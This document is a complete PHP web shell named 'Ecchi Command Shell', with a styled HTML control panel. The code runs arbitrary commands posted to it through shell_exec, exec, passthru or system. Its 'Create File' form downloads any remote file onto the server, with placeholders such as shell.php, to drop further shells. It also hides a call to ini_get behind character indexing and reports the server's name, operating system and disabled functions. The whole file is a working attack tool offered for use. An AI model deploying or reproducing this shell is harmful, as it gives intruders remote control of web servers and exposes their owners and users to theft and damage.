<?php
error_reporting(0);
clearstatcache(true);

/**
 * Summary of EcchiShell
 */
class EcchiShell
{

    /**
     * Summary of result
     * @var string
     */
    private $result = '';

    /**
     * Summary of __construct
     */
    public function __construct()
    {
        if (!empty($_POST['function']) && !empty($_POST['cmd'])) {
            $this->ExeCmd($_POST['function'], $_POST['cmd']);
        } else if (!empty($_POST['filename']) && !empty($_POST['url'])) {
            $this->newShell($_POST['filename'], $_POST['url']);
        }
    }

    /**
     * Summary of newShell
     * @return null
     */
    private function newShell($filename, $url)
    {
        $getFile = file_get_contents($url);
        if (!file_exists($filename)) {
            file_put_contents($filename, $getFile);
        } else {
            $openFile = fopen($filename, "w");
            fwrite($openFile, $getFile);
            fclose($openFile);
        }

        $this->setResult("Success Create File <b>" . $filename . "</b> at <b><i>" . str_replace("\\", "/", dirname(__FILE__) . "/" . $filename) . "</b></i>");
    }

    /**
     * Summary of cURL
     * @param mixed $url
     * @param mixed $postFields
     * @param mixed $post
     * @return bool|string
     */
    private function cURL($url, $post = false, $postFields = [])
    {
        $ch = curl_init();

        if ($post) {
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => http_build_query($postFields)
            ]);
        } else {
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_CUSTOMREQUEST => 'GET'
            ]);
        }

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $respone = curl_exec($ch);
        curl_close($ch);

        return $respone;
    }

    /**
     * Summary of SEORank
     * @return array|string|null
     */
    public function SEORank()
    {
        $postData = [
            "getStatus" => "1",
            "siteID" => "1",
            "sitelink" => $_SERVER['SERVER_NAME'],
            "da" => "1",
            "pa" => "1",
            "alexa" => "1"
        ];

        $getRank = $this->cURL("https://www.checkmoz.com/bulktool", true, $postData);
        preg_match_all('/(.*?)<\/td>/', $getRank, $get);
        $getSEO = preg_replace('/<td>/', '', $get[1]);

        return $getSEO;
    }

    /**
     * Summary of getDisable
     * @param mixed $act
     * @return mixed
     */
    public function getDisable($act = null)
    {
        define("low", range("a", "z"));
        $in = low[8] . low[13] . low[8] . "_" . low[6] . low[4] . low[19];
        if ($act == 'UI') {
            return $in("disable_functions") ?: 'Nothing';
        } else {
            return $in("disable_functions");
        }
    
        // return ($act === 'UI') ? ($in("disable_functions") ?? 'Nothing') : $in("disable_functions");
    }

    /**
     * Summary of getOS
     * @return string
     */
    public function getOS()
    {
        return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux';
    }

    /**
     * Summary of getInformationSystem
     * @return string
     */
    public function getInformationSystem()
    {
        $information_system = '';
        $os = $this->getOS();

        switch ($os) {
            case 'Linux':
                $information_system = php_uname();
                break;

            default:
                if (class_exists('COM')) {
                    $wmi = new COM('winmgmts://');
                    $os = $wmi->ExecQuery('SELECT * FROM Win32_OperatingSystem');
                    foreach ($os as $os_info) {
                        $information_system .= 'Operating System: ' . $os_info->Caption . PHP_EOL;
                        $information_system .= 'Kernel Type: ' . $os_info->OSArchitecture . PHP_EOL;
                        $version = explode(".", $os_info->Version);
                        $information_system .= 'Version: ' . $version[0] . '.' . $version[1] . PHP_EOL;
                    }
                } else {
                    $result = [];
                    $exectution = "exec";
                    $exectution('systeminfo', $result);
                    if (!empty($result)) {
                        foreach ($result as $line) {
                            switch (true) {
                                case (strpos($line, 'OS Name:') !== false):
                                    $os_name = trim(str_replace('OS Name:', '', $line));
                                    $information_system .= "<br>Operating System: " . $os_name . PHP_EOL;
                                    break;

                                case (strpos($line, 'System Type:') !== false):
                                    $kernel_type = trim(str_replace('System Type:', '', $line));
                                    $information_system .= '<br>Kernel Type: ' . $kernel_type . PHP_EOL;
                                    break;

                                case (strpos($line, 'Version:') !== false && strpos($line, 'BIOS Version:') === false):
                                    $version = trim(str_replace('Version:', '', $line));
                                    $information_system .= '<br>Version: ' . $version . PHP_EOL;
                                    break;

                                case (strpos($line, 'Host Name') !== false):
                                    $host_name = trim(str_replace('Host Name:', '', $line));
                                    $information_system .= '<br>User: ' . $host_name . PHP_EOL;
                                    break;

                                case (strpos($line, 'BIOS Version:') !== false):
                                    $bios = trim(str_replace('BIOS Version:', '', $line));
                                    $information_system .= '<br>Bios: ' . $bios . PHP_EOL;
                                    break;

                                default:
                                    break;
                            }
                        }
                    } else {
                        $information_system = "Can't Get Information System";
                    }
                }
                break;
        }

        return $information_system;
    }

    /**
     * Summary of ExeCmd
     * @param mixed $command
     * @param mixed $payload
     * @return null
     */
    private function ExeCmd($command, $payload)
    {
        $split = explode(",", $this->getDisable());
        if (in_array($command, $split)) {
            $this->setResult("Function Is Disable : $command");
        } else {
            if ($command == 'shell_exec') {
                $this->result = $command($payload);
            } else if ($command == 'exec') {
                $command($payload, $this->result);
                $this->result = join("\n", $this->result);
            } else if ($command == 'passthru' || 'system') {
                ob_start();
                $command($payload);
                $this->result = ob_get_contents();
                ob_end_clean();
            } else {
                $this->result = call_user_func_array($command, $payload);
            }

            $this->setResult($this->result);
        }
    }

    /**
     * Summary of getServerSoftware
     * @return mixed
     */
    public function getServerSoftware()
    {
        return isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : null;
    }

    public function getPHPVersion()
    {
        return phpversion();
    }


    /**
     * @return mixed
     */
    public function getResult()
    {
        return $this->result;
    }

    /**
     * @param mixed $result 
     * @return self
     */
    public function setResult($result): self
    {
        $this->result = $result;
        return $this;
    }
}

$ecchishell = new EcchiShell;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Primary Meta Tags -->
    <title>Ecchi Command Shell</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="title" content="Ecchi Command Shell">
    <meta name="description" content="Simple Command Shell">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://ecchiexploit.blogspot.com">
    <meta property="og:title" content="Ecchi Command Shell">
    <meta property="og:description" content="Simple Command Shell">
    <meta property="og:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://ecchiexploit.blogspot.com">
    <meta property="twitter:title" content="Ecchi Command Shell">
    <meta property="twitter:description" content="Simple Command Shell">
    <meta property="twitter:image" content="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg">

    <!-- Icon -->
    <link rel="icon" href="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" type="image/png">

    <!-- CSS -->
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">

    <style type="text/css">
        ::-webkit-scrollbar {
            width: 12px;
        }

        ::-webkit-scrollbar-track {
            -webkit-box-shadow: inset 0 0 6px #00ffff;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            border-radius: 10px;
            -webkit-box-shadow: inset 0 0 6px #00ffff;
        }

        .offcanvas-body,
        .offcanvas-header {
            background-color: #000;
            border: 1px solid #00ffff;
        }

        .offcanvas {
            margin-top: 10%;
            height: 62%;
            box-shadow: 0px 0px 10px 0px #00ffff;
        }

        .custom-card {
            background-color: #000;
            border: 1px solid #00ffff;
            box-shadow: 0px 0px 10px 0px #00ffff;
            color: #43C6AC;
        }

        .fixed-top-right {
            position: fixed;
            top: 17px;
            right: 30px;
            z-index: 1032;
            width: 150px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            box-sizing: border-box;
        }

        .fixed-top-right:hover {
            border: 1px solid #00ffff;
            background-color: #000;
        }

        @media only screen and (max-width: 767.98px) {
            .fixed-top-right {
                width: 80px;
                top: 20px;
                right: 15px;
            }

            .offcanvas {
                width: 50%;
                margin-top: 25%;
            }
        }
    </style>
</head>

<body class="bg-dark">
    <button class="btn fixed-top-right btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
        type="button" data-bs-toggle="offcanvas" data-bs-target="#MyMenuShell" aria-controls="MyMenuShell"
        aria-expanded="false" aria-label="Toggle navigation">
        <img src="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" alt="Toggle Menu" class="img-fluid">
    </button>

    <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MyMenuShell" aria-labelledby="MyMenuShell">
        <div class="offcanvas-header">
            <h5 class="offcanvas-title" id="MyMenuShell">Server Info</h5>
            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body small">
            <p>
                Rank Alexa : <span>
                    <?= $ecchishell->SEORank()[4] ?>
                </span> |
                DA : <span>
                    <?= $ecchishell->SEORank()[2] ?>
                </span> |
                PA : <span>
                    <?= $ecchishell->SEORank()[3] ?>
                </span>
            </p>
            <p>OS : <span>
                    <?= $ecchishell->getOS() ?>
                </span></p>
            <p>PHP Version : <span>
                    <?= $ecchishell->getPHPVersion() ?>
                </span></p>
            <p>Software : <span>
                    <?= $ecchishell->getServerSoftware() ?>
                </span></p>
            <p>Information System : <span>
                    <?= $ecchishell->getInformationSystem() ?>
                </span></p>
        </div>
    </div>

    <div class="container-fluid">
        <div class="card card-body text-center mt-2 custom-card">
            <h3>Ecchi Command Shell</h3>
        </div>
    </div>

    <form method="POST">
        <div class="container-fluid mt-3">
            <div class="row">
                <div class="col-md-4 mb-3">
                    <div class="card card-body custom-card text-wrap" style="height: 270px;">
                        <h5 class="text-center">Disable Functions</h5>
                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
                        <p class="text-capitalize fst-italic overflow-auto">
                            <?= $ecchishell->getDisable("UI") ?>
                        </p>
                    </div>
                </div>

                <!-- Command Shell -->
                <div class="col-md-4 mb-3">
                    <div class="card card-body custom-card">
                        <h5 class="text-center">Command Execution</h5>
                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
                        <div class="mb-2">
                            <label for="function" class="form-label">Function Execution</label>
                            <input type="text" class="form-control" id="function" name="function"
                                placeholder="shell_exec">
                        </div>
                        <div class="mb-2">
                            <label for="cmd" class="form-label">Command / Payload</label>
                            <input type="text" class="form-control" id="cmd" name="cmd" placeholder="ls -la">
                        </div>
                        <button class="form-control custom-card" type="submit">Execution</button>
                    </div>
                </div>

                <!-- Create File -->
                <div class="col-md-4 mb-3">
                    <div class="card card-body custom-card">
                        <h5 class="text-center">Create File</h5>
                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
                        <div class="mb-2">
                            <label for="url" class="form-label">URL</label>
                            <input type="text" class="form-control" id="url" name="url"
                                placeholder="https://file.com/shell.txt">
                        </div>
                        <div class="mb-2">
                            <label for="filename" class="form-label">Filename</label>
                            <input type="text" class="form-control" id="filename" name="filename"
                                placeholder="shell.php">
                        </div>
                        <button class="form-control custom-card" type="submit">Create File</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="container-fluid mb-3">
            <div class="row">
                <div class="col-md-12">
                    <div class="card card-body custom-card overflow-auto text-wrap" style="height: 200px;">
                        <h5 class="text-center">Result</h5>
                        <span class="border border-1 mb-2" style="border-color: #43C6AC !important;"></span>
                        <p class="mt-2 fst-italic">
                            <?= $ecchishell->getResult() ?>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </form>

    <div class="container-fluid pt-3">
        <div class="text-info text-center">
            <h5>./EcchiExploit</h5>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
